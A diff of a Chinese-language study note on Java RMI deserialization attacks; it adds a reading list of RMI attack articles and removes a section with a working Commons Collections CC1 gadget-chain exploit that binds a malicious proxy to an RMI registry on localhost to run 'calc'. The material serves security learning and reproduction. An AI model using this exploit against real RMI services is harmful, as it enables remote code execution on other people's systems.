@@ -8,7 +8,17 @@
 
 **推荐阅读（按序）**
 
-1. https://www.oreilly.com/library/view/learning-java/1565927184/ch11s04.html
+1. [JAVA RMI 反序列化知识详解 (seebug.org)](https://paper.seebug.org/1194/)
+
+这篇文章从全局的角度说了下RMI，但并不深入，对初学者来说很友好。看完大概知道如何实现一个基本的rmi应用以及如何利用yso官方给的exp进行rmi攻击。
+
+2. https://www.oreilly.com/library/view/learning-java/1565927184/ch11s04.html
+
+来自learning java这本书，里面对rmi进行了详细的描述，不过要注意的是并没有从安全的角度进行分析，而是用文字和一些基本代码阐述rmi的原理等等。
+
+3. [Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上） (seebug.org)](https://paper.seebug.org/1091/#java-rmi_3)
+
+rmi的攻击手法汇总。
 
 记录一下关于阅读上述文章的复现
 
@@ -41,87 +51,6 @@
         <artifactId>commons-collections</artifactId>
         <version>3.2.1</version>
     </dependency>
-```
-
-
-
-### bind() 和 readbind()
-
-这两个方法最终会根据传入的远程对象调用 readObject() 方法，所以存在反序列化漏洞。exp 编写的核心思路也不复杂，已知最终会根据远程对象调用 readObject()，并且我们知道远程对象实际上是一个代理实例，所以可以在远程对象的调用处理器上着手。巧合的是，CC1 刚好就利用到了某个调用处理器类进行攻击，我们把 CC1 的 payload 搬过来直接用就好，不过要注意定义完代理类实例要转成 Remote 对象。
-
-```java
-import org.apache.commons.collections.Transformer;  
-import org.apache.commons.collections.functors.ChainedTransformer;  
-import org.apache.commons.collections.functors.ConstantTransformer;  
-import org.apache.commons.collections.functors.InvokerTransformer;  
-import org.apache.commons.collections.map.TransformedMap;  
-  
-import java.lang.annotation.Target;  
-import java.lang.reflect.Constructor;  
-import java.lang.reflect.InvocationHandler;  
-import java.lang.reflect.Proxy;  
-import java.rmi.Remote;  
-import java.rmi.registry.LocateRegistry;  
-import java.rmi.registry.Registry;  
-import java.util.HashMap;  
-import java.util.Map;  
-  
-public class AttackRegistryEXP {  
-    public static void main(String[] args) throws Exception{  
-
-        Registry registry = LocateRegistry.getRegistry(
-            "127.0.0.1",
-            1099
-        );  
-        InvocationHandler handler = (InvocationHandler) CC1();
-
-        Remote remote = Remote.class.cast(Proxy.newProxyInstance(  
-                Remote.class.getClassLoader(),
-                new Class[] { Remote.class }, 
-                handler)
-            );  
-        registry.bind("test",remote);  
- }  
-  
-    public static Object CC1() throws Exception{
-
-        Transformer[] transformers = new Transformer[]{
-                new ConstantTransformer(Runtime.class),
-                new InvokerTransformer(
-                    "getMethod",  
-                    new Class[]{String.class, Class[].class}, 
-                    new Object[]{"getRuntime", null}
-                ),  
-                new InvokerTransformer(
-                    "invoke", 
-                    new Class[]{Object.class, Object[].class}, 
-                    new Object[]{null, null}
-                ),  
-                new InvokerTransformer(
-                    "exec", 
-                    new Class[]{String.class}, 
-                    new Object[]{"calc"}
-                )  
-        };  
-        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
-        HashMap<Object, Object> hashMap = new HashMap<>();  
-        hashMap.put("value","drunkbaby");  
-        Map<Object, Object> transformedMap = TransformedMap.decorate(
-            hashMap, 
-            null, 
-            chainedTransformer
-        );  
-        Class c = Class.forName(
-            "sun.reflect.annotation.AnnotationInvocationHandler"
-        );  
-        Constructor aihConstructor = c.getDeclaredConstructor(
-            Class.class, Map.class
-        );  
-        aihConstructor.setAccessible(true);  
-        Object o = aihConstructor.newInstance(Target.class, transformedMap);  
-        return o;  
- }  
-}
 ```
 
 
